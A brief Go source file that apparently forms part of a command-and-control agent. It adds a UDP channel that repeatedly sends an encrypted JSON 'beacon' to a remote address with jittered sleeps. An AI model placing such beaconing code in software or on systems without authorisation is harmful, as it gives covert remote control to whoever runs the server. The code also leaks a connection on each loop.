package sockets

import (
	"../util"
	"encoding/json"
	"fmt"
	"log"
	"net"
)

type UDP struct { }

func init() {
	CommunicationChannels["udp"] = UDP{}
}

func (contact UDP) Communicate(address string, sleep int, beacon Beacon) {
	for {
	   conn, err := net.Dial("udp", address)
	   if err == nil {
		   data, _ := json.Marshal(beacon)
		   fmt.Fprintf(conn, string(util.Encrypt(data)))
		} else {
			log.Print(fmt.Sprintf("[-] %s", err))
		}
		jitterSleep(sleep * 10, "UDP")
	}
}
